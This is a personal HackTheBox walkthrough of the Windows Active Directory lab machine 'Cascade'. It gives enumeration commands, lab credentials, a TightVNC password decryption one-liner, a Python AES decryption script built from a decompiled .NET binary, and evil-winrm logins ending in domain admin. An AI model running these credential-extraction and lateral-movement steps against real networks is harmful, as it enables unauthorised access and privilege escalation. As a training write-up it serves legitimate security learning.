---
title: "HTB Cascade Walkthrough"
machine_name: "Cascade"
difficulty: "Medium"
os: "Windows"
date_completed: "2025-05-01"
techniques: ["Active Directory", "LDAP Enumeration", "Base64 Decoding", "TightVNC Decryption", "AES Decryption", ".NET Decompilation", "AD Recycle Bin", "RPC Enumeration", "SMB Enumeration"]
box_ip: "10.10.10.182"
machine_rank: "#9183"
htb_completion_image: "cascade.png"
---

![HTB Cascade Completion](/static/imgs/walkthroughs/cascade.png)

In this walkthrough, I'll guide you through Cascade from HackTheBox, a medium-difficulty Windows Active Directory machine. The attack path involves discovering credentials stored in unusual locations, reverse engineering .NET applications, and navigating through multiple user accounts to eventually reach domain admin privileges.

## Box Information
- **Platform:** HackTheBox
- **Operating System:** Windows Server 2008 R2 SP1
- **Domain:** cascade.local
- **Host:** CASC-DC1
- **Date Completed:** May 1, 2025

## Initial Enumeration & User Flag

### Commands

```bash
# Enumerating Open Services
nmap -p- --min-rate 5000 -vvv -n -Pn 10.10.10.182 -oG nmap/allPorts
extractPorts nmap/allPorts
nmap -sCV -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165 10.10.10.182 -oN nmap/detailed
sudo vim /etc/hosts # add cascade.local

# RPC ENUM
rpcclient -U '' -N 10.10.10.182
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> enumprivs
rpcclient $> enumalsgroups domain

# SMB ENUM
netexec smb 10.10.10.182 -u '' -p '' --shares # NO SMB NULL

# LDAP ENUM
ldapsearch -H ldap://10.10.10.182 -x -b 'DC=cascade,DC=local' -s sub > ldap_sub.txt
ldapsearch -H ldap://10.10.10.182 -x -b 'DC=cascade,DC=local' -s base > ldap_base.txt
grep thomp -A 10 -B 10 ldap_sub.txt

# Found cascadeLegacyPwd field with a base64 encoded password
echo 'clk0bjVldmE=' | base64 -d # Password -> rY4n5eva
netexec smb 10.10.10.182 -u users -p 'rY4n5eva' --shares # Got a hit on r.thompson

# Data Share Enum
smbclient -U 'r.thompson' \\\\10.10.10.182\\Data
smb: \> dir
smb: \> cd IT
smb: \IT> cd "Email Archives"
smb: \IT\Email Archives> mget Meeting_Notes_June_2018.html
firefox Meeting_Notes_June_2018.html OR cat Meeting_Notes_June_2018.html

smb: \Temp\s.smith> cd ../Temp/s.smith
smb: \Temp\s.smith> mget * # just get the one file in there

cat 'VNC Install.reg' # Password field found, with a hex encoded password
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv

# Password is 'sT333ve2'
netexec winrm 10.10.10.182 -u 's.smith' -p 'sT333ve2' # Pwn3d!
```

### Interesting Open Ports and Services

```
53/tcp - Microsoft DNS 6.1.7601
88/tcp - Kerberos
135/tcp - RPC
389/tcp - LDAP
445/tcp - SMB
```

### Enumeration Findings

- Windows Server 2008 R2 SP1
- Domain: cascade.local
- Host: CASC-DC1
- RPC Null Auth allowed user enumeration
- SMB NULL authentication not available
- LDAP search revealed `r.thompson` user with base64 encoded password in cascadeLegacyPwd field
- Successfully authenticated as `r.thompson` with password `rY4n5eva`
- Discovered non-common Data share with `r.thompson's` read access
- Found `Meeting_Notes_June_2018.html` mentioning TempAdmin user with same password as admin account
- Found `VNC Install.reg` file containing hex-encrypted password for TightVNC
- Decrypted VNC password to `sT333ve2` for user `s.smith`
- `s.smith` has WinRM access to the machine
- Additional interesting files: `ArkAdRecycleBin.log` showing `TempAdmin` deletion by `ArkSvc` user, `dcdiag.log`

## Lateral Movement to ArkSvc user

### Commands

```bash
evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2

PS > net user s.smith # reveals the logon script (MapAuditDrive.vbs)

# Now to find the file to see contents
PS > $Path = Get-ChildItem -Path C:\ -Filter "MapAuditDrive.vbs" -Recurse -ErrorAction SilentlyContinue -Force | Select-Object -ExpandProperty FullName
PS > Write-Host $Path
PS > more C:\Windows\SYSVOL\sysvol\cascade.local\scripts\MapAuditDrive.vbs

smbclient -U 's.smith' \\\\10.10.10.182\\Audit$
smb: \DB\> mget Audit.db
smb: \> mget CascAudit.exe
smb: \> mget CascCrypto.dll

sqlite3 Audit.db
sqlite> .tables
sqlite> .dump

# Go to Windows VM and file transfer the files from the Audit$ share, then use DotPeek to look for everything. Keywords: 'main', 'DecryptString', these will help you find the code faster.
# Create the Python file for decryption of password, code in 'Real-Time Notes and Thought Process'
```

### Real-Time Notes and Thought Process

Once inside, I'm going to rely mostly on the walkthrough notes as I'm still working on my Windows enumerating skills once I get a shell. I'm using the HTB guiding questions first, and when stuck, using the walkthrough. The questions mention that there is a file running when the `s.smith` user logs on.

I found the file using `net user s.smith` OR `Get-ADUser -identity s.smith -properties *`, the file is named `MapAuditDrive.vbs`. I found its location to see its contents and found that it references the `Audit$` share in the domain. Inside this share, I found a SQLite file; once extracted, I used sqlite3 to enumerate it.

Using the `.dump` command, I found what looked like a base64 encoded password for the ArkSvc account. I quickly found out that the password is actually encrypted somehow, so I referred to the walkthrough to help me figure out a way to decrypt it.

**Encoded password:** `BQO5l5Kj9MdErXx6Q6AGOw==`

So it seems the database is used by the `CascAudit.exe` executable, this file is in the share. Once downloaded, we can decompile it to see how the password was encrypted. The file is a .NET executable, so we can use a .NET decompiler. The walkthrough uses dnSpy. It can be run on Linux using wine. I ran into some problems using dnSpy, so I booted up my Windows VM and used DotPeek instead.

Using DotPeek, I was able to find the key used to encrypt the password for `ArkSvc`

**Key:** `c4scadek3y654321`

The decrypt function does not seem to exist in the executable, so it might be loaded through a DLL. Looking at the Audit share, CascCrypto.dll is identified.

It is using AES 128-bit, mode 1, and IV `1tdyjCbY1Ix49842`

The walkthrough shows a Python script that can decrypt the password with the information we have gathered:

```python
import pyaes
from base64 import b64decode

key = b"c4scadek3y654321"
iv = b"1tdyjCbY1Ix49842"
aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
print(decrypted.decode())
```

This returns the password: `w3lc0meFr31nd`

Now we can get a shell as `ArkSvc`

## Privilege Escalation

### Commands

```bash
PS > evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
PS > net user ArkSvc OR Get-ADUser -identity ArkSvc -properties *
PS > Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
```

### Real-Time Notes and Thought Process

Once in the shell as `ArkSvc`, I queried the user groups and found the user was part of the AD Recycle Bin group. And recalling from previous steps, I know that the `ArkSvc` user deleted the `TempAdmin` user at some point. So I'm thinking I can get more info on that deletion process and maybe get the credentials of the deleted user.

I asked for a command to help me query the deleted objects and their properties. Once I got them, I saw that the `TempAdmin` object had the same `cascadeLegacyPwd` field as the `r.thompson` account before.

**Password:** `baCT3r1aN00dles`

With this password and recalling the HTML file we found earlier, we know that the TempAdmin's password was the same as the actual Admin account, so we can get a shell as the Administrator and get the root flag.

## Key Learning Points

### Technical Skills Gained
- TightVNC Password Decryption
- AES Decryption
- Decompiling .NET executables

### Methodology Improvements
- AD Enumeration methodology is solidifying, getting the basic information for the user flag in easy and medium AD boxes is becoming easier.
- This time, I wrote down every single command that revealed information. This was really good for me, it slowed me down and made me think about the commands I was going to use rather than spam different commands in hopes of getting something.

### Personal Growth Notes
- I'm gaining confidence in the enumeration process of AD environments, it's starting to make more and more sense. I'm not just copy pasting the commands, I'm starting to see links between the information I gather and possible paths.
- My note-taking is also getting better, as mentioned above.

## Summary of Attack Path

1. Enumerated domain users via RPC null authentication
2. Found `r.thompson's` base64 encoded password in LDAP
3. Used `r.thompson` to access Data share
4. Found VNC password for `s.smith` in registry file
5. Accessed box as s.smith via WinRM
6. Discovered logon script pointing to `Audit$` share
7. Found encrypted database credentials for `ArkSvc`
8. Decompiled executables to extract encryption key and algorithm
9. Decrypted `ArkSvc` password
10. Used `ArkSvc's` AD Recycle Bin access to find deleted `TempAdmin` user
11. Retrieved `TempAdmin's` password which also worked for `Administrator`
12. Gained full Administrator access to the domain controller
